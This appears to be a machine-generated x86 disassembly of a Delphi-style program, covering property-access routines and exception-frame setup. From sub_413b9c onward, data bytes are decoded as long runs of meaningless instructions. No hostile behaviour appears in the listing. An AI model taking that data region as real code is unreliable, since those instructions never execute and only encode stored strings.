xor ch [ eax + ebx + 0x1a ]
test ch 0xdf
jne r-xdata
sub_413254
push ebx
push esi
push edi
xor ecx ecx
mov esi eax
mov cl [ eax + 0x1 ]
mov edi edx
xor eax eax
movzx ecx [ esi + ecx + 0xa ]
[ edi ]
mov esi [ esi + 0x4 ]
xor ecx ecx
test esi esi
je r-xdata
lea edi [ esi + ecx + 0xd ]
pop edi
pop esi
pop ebx
retn
mov esi [ esi ]
jmp r-xdata
lea edi [ edi + ecx + 0x1b ]
dec eax
jne r-xdata
mov [ edx + ebx * 4 ] edi
mov cl [ esi + 0x1 ]
lea esi [ esi + ecx + 0x2 ]
mov cl [ esi + 0xa ]
movzx eax [ esi + ecx + 0xb ]
test eax eax
je r-xdata
movzx ebx [ edi + 0x18 ]
mov cl [ edi + 0x1a ]
cmp [ edx + ebx * 4 ] 0x0
jne r-xdata
sub_4132a8
push ebx
push edi
mov edi [ edx ]
mov edi [ edi ]
mov bl 0x4
cmp [ edi ] 0x7
je r-xdata
mov ecx [ edx + 0x4 ]
cmp [ edx + 0x7 ] 0xfe
mov edx [ edx + 0x10 ]
jb r-xdata
xor ecx ecx
mov cl [ edi + 0x1 ]
mov bl [ edi + ecx + 0x2 ]
call ecx
jmp r-xdata
ja r-xdata
cmp bl 0x4
jae r-xdata
and ecx 0xffffff
add ecx eax
mov al [ ecx ]
cmp bl 0x2
jb r-xdata
movsx ecx cx
add ecx [ eax ]
call [ ecx ]
jmp r-xdata
pop edi
pop ebx
retn
cmp bl 0x2
jae r-xdata
mov ax [ ecx ]
cmp bl 0x4
jb r-xdata
movsx eax ax
je r-xdata
cmp bl 0x0
movsx eax al
je r-xdata
mov eax [ ecx ]
and eax 0xffff
and eax 0xff
pop edi
pop ebx
retn
sub_41331c
push ebx
push esi
push edi
mov edi edx
mov esi [ edi ]
mov esi [ esi ]
mov bl 0x4
cmp [ esi ] 0x7
je r-xdata
mov edx [ edi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
xor ebx ebx
mov bl [ esi + 0x1 ]
mov bl [ esi + ebx + 0x2 ]
mov esi [ edi + 0x8 ]
cmp [ edi + 0xb ] 0xfe
ja r-xdata
mov edx ecx
and esi 0xffffff
add eax esi
mov [ eax ] cl
cmp bl 0x2
jb r-xdata
jb r-xdata
pop edi
pop esi
pop ebx
retn
mov [ eax ] cx
cmp bl 0x4
jb r-xdata
call esi
jmp r-xdata
movsx esi si
add esi [ eax ]
call [ esi ]
jmp r-xdata
mov [ eax ] ecx
sub_413378
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_413407
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_413128
mov esi [ eax + 0x1 ]
movzx eax [ ebx ]
dec al
je r-xdata
mov eax edi
call sub_4099e8
mov ebx eax
sub ebx esi
jmp r-xdata
dec al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41340e
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
mov ebx edi
test ebx ebx
je r-xdata
sub al 0x7
je r-xdata
lea eax [ ebp - 0x4 ]
push eax
mov ecx ebx
dec ecx
mov edx 0x2
mov eax edi
call sub_405384
mov eax [ ebp - 0x4 ]
call sub_4099e8
mov ebx eax
sub ebx esi
jmp r-xdata
sub ebx 0x4
mov ebx [ ebx ]
jmp r-xdata
mov edx edi
mov eax ebx
call sub_413180
mov ebx eax
sub_413418
push esi
push edi
mov esi edx
mov edx [ esi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
mov edi [ esi + 0x8 ]
cmp [ esi + 0xb ] 0xfe
ja r-xdata
mov edx ecx
and edi 0xffffff
add edi eax
mov eax [ esi ]
mov eax [ eax ]
mov esi ecx
xor ecx ecx
mov cl [ eax + 0x1 ]
mov cl [ eax + ecx + 0x2 ]
lodsb [ esi ]
cmp al cl
jb r-xdata
jb r-xdata
stosb [ edi ]
mov cl al
[ edi ] [ esi ]
pop edi
pop esi
retn
mov al cl
call edi
pop edi
pop esi
retn
movsx edi di
add edi [ eax ]
call [ edi ]
pop edi
pop esi
retn
sub_41346c
push ebx
push esi
push edi
add esp 0xffffff00
mov edi ecx
mov esi edx
mov ebx eax
mov eax esp
mov edx edi
mov ecx 0xff
call sub_4050fc
mov ecx esp
mov edx esi
mov eax ebx
call sub_413418
add esp 0x100
pop edi
pop esi
pop ebx
retn
sub_4134b4
push esi
push edi
mov esi edx
mov edx [ esi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
mov edi [ esi + 0x8 ]
cmp [ esi + 0xb ] 0xfe
ja r-xdata
mov edx ecx
and edi 0xffffff
add eax edi
mov edx ecx
call sub_4134a0
pop edi
pop esi
retn
jb r-xdata
call edi
pop edi
pop esi
retn
movsx edi di
add edi [ eax ]
call [ edi ]
pop edi
pop esi
retn
sub_4134f4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41353c
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx edi
call sub_4057bc
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
call sub_41357c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_413543
lea eax [ ebp - 0x4 ]
call sub_40566c
retn
sub_41354c
push ebx
mov ebx [ edx ]
mov ebx [ ebx ]
movzx ebx [ ebx ]
sub bl 0x5
je r-xdata
call sub_41346c
pop ebx
retn
sub bl 0x5
je r-xdata
call sub_4134b4
pop ebx
retn
dec bl
je r-xdata
call sub_4134f4
jmp r-xdata
pop ebx
retn
sub_41357c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov edi ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_413643
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx ]
mov eax [ eax ]
movzx eax [ eax ]
sub al 0x5
je r-xdata
lea eax [ ebp - 0xc ]
mov edx edi
call sub_4050e8
mov ecx [ ebp - 0xc ]
mov edx ebx
mov eax esi
call sub_41354c
jmp r-xdata
sub al 0x5
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41364a
lea eax [ ebp - 0xc ]
call sub_404e44
retn
dec al
je r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
and edx 0xff000000
cmp edx 0xff000000
jne r-xdata
jmp r-xdata
cmp edx 0xfe000000
jne r-xdata
mov ebx eax
and ebx 0xffffff
add ebx esi
mov eax ebx
mov edx edi
call sub_4056a8
jmp r-xdata
mov [ ebp - 0x8 ] eax
mov edx [ esi ]
movsx eax ax
add edx eax
mov eax [ edx ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov ecx edi
mov edx eax
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
mov edx edi
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
mov [ ebp - 0x4 ] esi
mov eax [ ebx + 0x10 ]
cmp eax 0x80000000
jne r-xdata
sub_413654
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi edx
mov edi eax
mov ebx [ esi + 0x8 ]
mov eax [ esi ]
mov eax [ eax ]
call sub_413128
movzx eax [ eax ]
mov edx ebx
and edx 0xff000000
cmp edx 0xff000000
jne r-xdata
cmp edx 0xfe000000
jne r-xdata
mov edx ebx
and edx 0xffffff
add edx edi
and eax 0x7f
cmp eax 0x4
ja r-xdata
mov [ ebp - 0x8 ] ebx
mov edx [ edi ]
movsx ecx bx
add edx ecx
mov edx [ edx ]
mov [ ebp - 0x8 ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0xc
jmp [ eax * 4 + jump_table_41369d ]
and eax 0x7f
cmp eax 0x4
ja r-xdata
and eax 0x7f
cmp eax 0x4
ja r-xdata
mov [ ebp - 0x4 ] edi
mov edx [ esi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
fld [ ebp + 0x8 ]
fstp [ edx ]
fwait
jmp r-xdata
fld [ ebp + 0x8 ]
fstp [ edx ]
fwait
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ edx ] eax
mov eax [ ebp + 0xc ]
mov [ edx + 0x4 ] eax
mov ax [ ebp + 0x10 ]
mov [ edx + 0x8 ] ax
jmp r-xdata
fld [ ebp + 0x8 ]
fistp [ edx ]
fwait
jmp r-xdata
fld [ ebp + 0x8 ]
fmul [ r-xdata ]
fistp [ edx ]
fwait
jmp r-xdata
jmp [ eax * 4 + jump_table_4137cc ]
jmp [ eax * 4 + jump_table_413739 ]
fld [ ebp + 0x8 ]
add esp 0xfffffffc
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
movzx eax [ ebp + 0x10 ]
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
fmul [ r-xdata ]
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
fld [ ebp + 0x8 ]
add esp 0xfffffffc
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
movzx eax [ ebp + 0x10 ]
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
fmul [ r-xdata ]
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
sub_413860
push esi
push edi
mov esi edx
mov edx [ esi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
mov edi [ esi + 0x8 ]
cmp [ esi + 0xb ] 0xfe
ja r-xdata
mov edx ecx
and edi 0xffffff
add eax edi
mov edx ecx
call sub_41384c
pop edi
pop esi
retn
jb r-xdata
call edi
pop edi
pop esi
retn
movsx edi di
add edi [ eax ]
call [ edi ]
pop edi
pop esi
retn
sub_4138a0
push ebx
mov ebx [ edx + 0x8 ]
cmp [ edx + 0xb ] 0xfe
ja r-xdata
and ebx 0xffffff
add eax ebx
mov edx [ ecx ]
mov ebx [ ecx + 0x4 ]
mov [ eax ] edx
mov [ eax + 0x4 ] ebx
pop ebx
retn
mov edx [ edx + 0x10 ]
push [ ecx + 0x4 ]
push [ ecx ]
jb r-xdata
call ebx
pop ebx
retn
movsx ebx bx
add ebx [ eax ]
call [ ebx ]
pop ebx
retn
sub_4138d8
push ebp
mov ebp esp
cmp [ edx + 0xb ] 0xfe
mov ecx [ edx + 0x8 ]
ja r-xdata
and ecx 0xffffff
add eax ecx
mov edx [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
mov [ eax ] edx
mov [ eax + 0x4 ] ecx
mov edx [ edx + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
jb r-xdata
call ecx
jmp r-xdata
movsx ecx cx
add ecx [ eax ]
call [ ecx ]
jmp r-xdata
pop ebp
retn 0x8
sub_413914
push ebx
push esi
add esp 0xfffffff8
mov esi ecx
mov ecx [ edx + 0x8 ]
mov ebx ecx
and ebx 0xff000000
cmp ebx 0xff000000
jne r-xdata
cmp ebx 0xfe000000
jne r-xdata
mov ebx ecx
and ebx 0xffffff
add ebx eax
mov eax ebx
mov edx esi
call sub_406b0c
jmp r-xdata
mov [ esp ] ecx
mov ebx [ eax ]
movsx ecx cx
add ebx ecx
mov ecx [ ebx ]
mov [ esp ] ecx
jmp r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
mov ecx esi
mov edx eax
mov eax [ esp + 0x4 ]
call [ esp ]
mov edx esi
mov eax [ esp + 0x4 ]
call [ esp ]
jmp r-xdata
mov [ esp + 0x4 ] eax
mov eax [ edx + 0x10 ]
cmp eax 0x80000000
jne r-xdata
sub_413988
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4139ce
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4139d5
retn
mov eax rw-data
mov ecx 0x2
mov edx [ r-xdata ]
call sub_405af0
mov eax rw-data
call sub_404e44
sub_413b9c
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
in al 0x3b
inc ecx
add [ eax + eax ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0xc00413c ] ah
add [ eax ] al
add ah dh
cmp eax [ ecx ]
lodsb [ esi ]
inc ecx
inc eax
add [ eax - 0x43ffbfbf ] bh
inc ecx
inc eax
add al al
inc ecx
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
inc eax
add [ edi + edi + 0x40 ] dl
add [ 0x72434645 ] cl
popad
je r-xdata
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc ebp
jb r-xdata
add [ eax ] ecx
push es
push ebx
outsb
jb r-xdata
inc eax
add [ eax + 0x3c ] al
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x3c ] al
inc ecx
add [ eax + eax ] cl
add [ eax ] al
cwde
cmp eax [ ecx ]
lodsb [ esi ]
inc ecx
inc eax
add [ eax - 0x43ffbfbf ] bh
inc ecx
inc eax
add al al
inc ecx
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
add [ eax ] al
cwde
cmp eax [ ecx ]
lodsb [ esi ]
inc ecx
inc eax
add [ eax - 0x43ffbfbf ] bh
inc ecx
inc eax
add al al
inc ecx
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + edi + 0x41 ] dl
add [ eax + eax ] cl
cmp eax 0x41
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
lodsb [ esi ]
cmp eax 0xc0041
add [ eax ] al
or [ 0x41ac0041 ] bh
inc eax
add [ eax - 0x43ffbfbf ] bh
inc ecx
inc eax
add al al
inc ecx
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
inc eax
add [ edi + edi + 0x40 ] dl
add [ edx ] cl
inc ebp
push edx
popad
inc ebp
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push esp
cmp eax 0xc0041
outsd
jb r-xdata
add [ eax ] al
les eax [ edx + 0x41ac0040 ]
inc eax
add [ eax - 0x43ffbfbf ] bh
inc ecx
inc eax
add al al
inc ecx
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
inc eax
add [ eax ] dl
adc [ eax ] eax
lea eax [ eax ]
in al 0x3b
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah ah
cmp eax [ ecx ]
or al 0x0
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x10 ] si
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah bh
cmp al 0x41
add [ eax + eax ] cl
add [ eax ] al
hlt
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + edi + 0x41 ] bl
add [ eax + eax ] cl
add [ eax ] al
or [ 0x41ac0041 ] bh
inc eax
add [ eax - 0x43ffbfbf ] bh
inc ecx
inc eax
add al al
inc ecx
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
inc eax
add [ edi + edi + 0x40 ] dl
add [ esi ] cl
inc ebp
inc ebx
insb
popad
jae r-xdata
outsd
jb r-xdata
inc eax
add [ edi + edi + 0x40 ] dl
add [ eax ] dl
inc ebp
inc esi
imul ebp [ ebp + 0x53 ] 0x61657274
insd
inc ebp
jb r-xdata
sar ah 0x3c
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + edi + 0x40 ] dl
add [ eax * 2 + 0x65727453 ] cl
popad
insd
inc ebp
jb r-xdata
inc eax
add [ eax + 0x413c ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
dec esi
outsd
je r-xdata
add [ eax ] bl
aas
inc eax
add [ edi + edi + 0x40 ] dl
add [ ebx ] cl
inc ebp
inc esi
imul ebp [ ebp + 0x72 ] 0x6f727245
jb r-xdata
cld
inc eax
add al 0x3e
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + edi ] al
inc ecx
add [ eax + eax ] cl
add [ eax ] al
or [ 0x41ac0041 ] bh
inc eax
add [ eax - 0x43ffbfbf ] bh
inc ecx
inc eax
add al al
inc ecx
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
inc eax
add [ edi + edi + 0x40 ] dl
add [ ebx ] cl
inc ebp
push edi
jb r-xdata
sbb [ edi ] bh
insb
aas
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + edi + 0x41 ] ch
inc eax
add [ edi + edi + 0x40 ] dl
add [ eax * 2 + 0x4e736552 ] cl
outsd
je r-xdata
inc eax
outsd
jne r-xdata
add [ eax ] bl
aas
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
je r-xdata
add [ eax ] bl
aas
inc eax
add [ edi + edi + 0x40 ] dl
add [ edx ] cl
inc ebp
dec esp
imul esi [ ebx + 0x74 ] 0x6f727245
jb r-xdata
add ah bh
inc eax
outsd
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
imul ebp [ esi + 0x67 ] 0x7473694c
inc ebp
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc al 0x3f
add [ eax ] al
add ah al
add [ eax ] 0xac
inc ecx
inc eax
add [ eax - 0x43ffbfbf ] bh
inc ecx
inc eax
add al al
inc ecx
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
nop
mov eax 0x413e
add [ eax ] al
inc ebp
jb r-xdata
add [ eax + eax ] cl
add [ eax ] al
les eax [ edx + 0x41ac0040 ]
inc eax
add [ eax - 0x43ffbfbf ] bh
inc ecx
inc eax
add al al
inc ecx
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
insb
aas
inc ecx
inc ecx
add [ eax + eax ] cl
add [ eax ] al
les eax [ edx + 0x41ac0040 ]
inc eax
add [ eax - 0x43ffbfbf ] bh
inc ecx
inc eax
add al al
inc ecx
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
lea eax [ eax ]
adc al 0x3f
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + edi ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
dec edi
push dx
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x10004140 ] al
add [ eax ] al
add ah bl
add [ eax ] 0xffffffac
inc ecx
inc eax
add [ eax - 0x43ffbfbf ] bh
inc ecx
inc eax
add al al
inc ecx
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov eax 0xc00413e
outsd
jb r-xdata
dec ecx
outsb
jbe r-xdata
shl [ eax + 0x4141 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov al [ 0x24004141 ]
add [ eax ] al
add [ eax + edx + 0x41ac0040 ] bh
inc eax
add [ eax - 0x43ffbfbf ] bh
inc ecx
add [ eax ] dl
add [ eax ] al
add [ eax + edx + 0x41ac0040 ] bh
inc eax
add [ eax - 0x43ffbfbf ] bh
inc ecx
inc eax
add al al
inc ecx
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
inc eax
add [ eax + 0x66 ] cl
inc ecx
add al dh
inc ecx
add [ edx + ebp * 2 ] dh
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
dec esp
inc ecx
inc ecx
jne r-xdata
add [ eax ] bl
aas
inc eax
add [ edi + edi + 0x40 ] dl
add [ edx ] cl
inc ebp
inc edx
imul esi [ ebx + esi * 2 + 0x45 ] 0x726f7272
nop
les edi [ edi ]
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah al
aas
inc ecx
add [ eax + eax ] cl
add [ eax ] al
les eax [ edx + 0x41ac0040 ]
inc eax
add [ eax - 0x43ffbfbf ] bh
inc ecx
inc eax
add al al
inc ecx
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
inc eax
add [ eax + eax * 2 ] ah
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + eax * 2 ] ah
inc ecx
add [ eax + eax ] cl
add [ eax ] al
les eax [ edx + 0x41ac0040 ]
inc eax
add [ eax - 0x43ffbfbf ] bh
inc ecx
inc eax
add al al
inc ecx
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
inc eax
add [ edi + edi + 0x40 ] dl
add [ edi ] cl
inc ebp
inc ebx
outsd
insd
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0xc00413e ] bh
inc ecx
add [ eax ] al
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + 0x671c0041 ] bl
inc ecx
add [ 0x73694c54 ] al
je r-xdata
insb
imul esp [ edi + ecx * 2 + 0x70 ] 0x74617265
imul ebp [ edi + 0x6e ] 0x413cc08b
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc eax
add al al
inc ecx
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
inc eax
add [ edx + ebp * 2 + 0x540b0041 ] cl
push esp
push 0x64616572
dec esp
imul esi [ ebx + 0x74 ] r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
clc
inc ecx
inc ecx
add [ eax + eax ] cl
add [ eax ] al
mov esp 0xac004010
inc ecx
inc eax
add [ eax - 0x43ffbfbf ] bh
inc ecx
inc eax
add al al
inc ecx
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
inc eax
add [ eax ] al
insb
inc ecx
add [ 0x74694254 ] al
jae r-xdata
ror [ edx + eax * 2 + 0x41 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + eax * 2 + 0x41 ] cl
arpl [ ebp + 0x73 ] sp
fadd [ eax + 0x41 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah bl
inc eax
inc ecx
add [ eax + eax ] cl
add [ eax ] al
les eax [ edx + 0x41ac0040 ]
inc eax
add [ eax - 0x43ffbfbf ] bh
inc ecx
inc eax
add al al
inc ecx
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
inc eax
add [ edi + edi + 0x40 ] dl
add [ ecx ] dl
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
outsb
outsb
je r-xdata
enter 0x416d 0x0
add al [ eax ]
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x42 ] bl
inc ecx
add [ esi + 0x42 ] ah
inc ecx
add [ eax + eax ] al
add [ eax ] al
mov esp 0xac004010
inc ecx
inc eax
add [ eax - 0x43ffbfbf ] bh
inc ecx
inc eax
add al al
inc ecx
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
inc eax
add [ ebp + ebp * 2 + 0x6eac0041 ] bl
inc ecx
add [ esi + ebp * 2 + 0x6dc80041 ] dh
inc ecx
add [ edx ] al
add bh bh
add [ eax - 0x23 ] al
inc eax
add [ edi + edi + 0x40 ] dl
add [ edi ] cl
inc ebp
dec edi
jne r-xdata
inc eax
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
fadd [ eax + 0x41 ]
outsd
jb r-xdata
add [ eax ] bl
aas
inc eax
add [ edi + edi + 0x40 ] dl
add [ eax ] dl
inc ebp
push ebx
je r-xdata
inc ecx
inc eax
add ah bh
inc eax
inc eax
inc ecx
add [ eax ] al
add [ eax ] al
sub_4142c1
popfd
inc edx
inc ecx
add [ ebx - 0x4affbebe ] ch
inc edx
inc ecx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esi
rol [ edx + 0x41 ] 0x0
or [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
lea eax [ eax ]
cmp al 0x43
inc ecx
add ch cl
inc edx
inc ecx
add [ eax ] al
add [ eax ] al
